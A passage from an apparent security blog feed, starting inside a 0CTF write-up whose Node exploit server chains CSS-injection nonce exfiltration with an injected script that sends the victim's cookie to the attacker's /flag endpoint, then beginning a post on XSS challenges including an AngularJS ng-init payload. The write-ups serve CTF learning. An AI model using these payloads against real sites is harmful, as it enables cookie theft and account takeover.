keyword">return</span> ending  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>         <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          isFound <span class="token operator">=</span> <span class="token boolean">true</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>leaks<span class="token punctuation">]</span>  leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'received:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span>  <span class="token keyword">const</span> merged <span class="token operator">=</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'leaked:'</span><span class="token punctuation">,</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> merged<span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/write'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNotes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/share_diary/'</span> <span class="token operator">+</span> id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/report?username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/start'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// create ccount</span>  username <span class="token operator">=</span> <span class="token function">getRandomStr</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> <span class="token function">getRandomStr</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  hasToken <span class="token operator">=</span> <span class="token boolean">false</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    username<span class="token punctuation">,</span>    password  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> resp <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token string">'note1'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;meta http-equiv="refresh" content="0;URL=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>selfHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp"></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token string">'note2'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;style>@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp1.css";@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp2.css";@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp3.css";&lt;/style></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'report username:'</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">report</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/leak'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    leaks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'recevied:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">,</span> leaks<span class="token punctuation">.</span>length<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment">// create a new note</span>      <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span>        <span class="token string">'note3'</span><span class="token punctuation">,</span>         result<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">nonce</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe srcdoc="&lt;script nonce=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">>top.location='</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>selfHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/flag?q='+encodeURIComponent(top.document.cookie)&lt;/script>">&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>      hasToken <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'note3 cteated'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/hasToken'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'polling...'</span><span class="token punctuation">,</span> hasToken<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>hasToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hasToken'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/exp'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'visit exp'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token string">'text/html'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;script>      let w = window.open('http://localhost/share/read#id=1&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')      function polling() &#123;        fetch('/hasToken').then(res => res.text()).then((res) => &#123;          if (res === 'hasToken') &#123;            w.location = 'http://localhost/share/read#id=2&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'          &#125;        &#125;)        setTimeout(() => &#123;          polling();        &#125;, 500)      &#125;      polling()    &lt;/script>  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By the way, if I hadn’t read that article, I’m not sure if I would have come up with this solution 😅</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;This year’s 0CTF had a total of three web challenges, one of which was client-side. I only solved this particular challenge and managed to get the first blood. This post will briefly document my solution.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CSS injection&lt;/li&gt;
&lt;li&gt;CSS exfiltration&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>A Bunch of Web and XSS Challenges</title>
    <link href="https://blog.huli.tw/2023/12/03/en/xss-and-web-challenges/"/>
    <id>https://blog.huli.tw/2023/12/03/en/xss-and-web-challenges/</id>
    <published>2023-12-03T04:40:00.000Z</published>
    <updated>2023-12-03T05:27:11.287Z</updated>
    
    <content type="html"><![CDATA[<p>Due to being busy lately, I haven’t been participating in CTFs as much in the past two or three months. However, I still come across some interesting challenges on Twitter. Even though I don’t have time to solve them, I still take notes because if I don’t, I won’t be able to solve them later for sure.</p><p>This post mainly documents some web front-end related challenges. Since I might not have personally solved them, the content is based on references from others’ notes, with some personal insights added.</p><p>Keyword list:</p><ol><li>copy paste XSS</li><li>connection pool</li><li>content type UTF16</li><li>multipart&#x2F;mixed</li><li>Chrome DevTools Protocol</li><li>new headless mode default download</li><li>Scroll to Text Fragment (STTF)</li><li>webVTT cue xsleak</li><li>flask&#x2F;werkzeug cookie parsing quirks</li></ol><span id="more"></span><h2><span id="dom-based-race-condition">DOM-based race condition</span></h2><p>Source: <a href="https://twitter.com/ryotkak/status/1710291366654181749">https://twitter.com/ryotkak/status/1710291366654181749</a></p><p>The challenge is quite simple. You are given an editable div with AngularJS enabled, allowing any user interaction to achieve XSS.</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">contenteditable</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://angular-no-http3.ryotak.net/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>When I first saw the challenge, I guessed it should be related to copy-paste. The solution mentioned that when pasting content into <code>&lt;div contenteditable&gt;&lt;/div&gt;</code>, HTML can be pasted. Although the browser later sanitizes it, it does not target custom attributes.</p><p>In other words, if combined with other gadgets, XSS can still be achieved.</p><p>For example, the author mentioned this pattern in their article, which executes code due to the presence of AngularJS:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>constructor.constructor('alert(1)')()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>However, the problem is that when users paste the payload, AngularJS has already finished loading. If the payload doesn’t exist when the loading is complete, it won’t be executed. Therefore, the loading time of AngularJS needs to be extended.</p><p>In the end, the author used a connection pool to solve this problem. By overwhelming the pool, the loading time of the script can be extended, allowing the payload to be pasted before the loading is complete.</p><p>Author’s writeup: <a href="https://blog.ryotak.net/post/dom-based-race-condition/">https://blog.ryotak.net/post/dom-based-race-condition/</a></p><h2><span id="uncommon-content-type-and-utf16">Uncommon Content-Type and UTF16</span></h2><p>Source: <a href="https://twitter.com/avlidienbrunn/status/1703805922043220273">https://twitter.com/avlidienbrunn/status/1703805922043220273</a></p><p>The challenge is as follows:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*FROM php:7.0-apacheRUN a2dismod statusCOPY ./files/index.php /var/www/htmlCOPY ./files/harder.php /var/www/htmlEXPOSE 80*/</span><span class="token variable">$message</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token 